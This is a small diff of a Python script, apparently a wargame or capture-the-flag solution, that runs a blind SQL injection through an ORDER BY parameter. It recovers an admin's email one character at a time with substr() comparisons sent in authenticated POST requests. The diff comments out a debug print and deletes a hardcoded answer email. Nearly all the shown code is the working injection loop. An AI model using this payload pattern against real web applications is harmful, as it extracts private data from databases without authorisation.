@@ -45,7 +45,7 @@ def GetEmail(t, s, lengthEmail):
         tmpChar = chr(j)
         payload = t + "?order=id='admin' and substr(email, " + str(i) + ", 1)=binary(\'" + tmpChar +"\') desc limit 1"
         r = requests.post(payload, cookies=(dict(PHPSESSID=s)))
-        print(payload)
+        #print(payload)
 
       # Caused by NewConnectionError('<urllib3.connection.VerifiedHTTPSConnection object at 0x7f9f58e66910>: Failed to establish a new connection: [Errno 110] Connection timed out'))
       except OSError as e:
@@ -76,5 +76,3 @@ if __name__ == "__main__":
 
   email = GetEmail(t, session, lengthEmail)
   print("Final Email : %s" %(email))
-  ## _ 필터링됨...
-  #print("admin_secure_email@emai1.com")
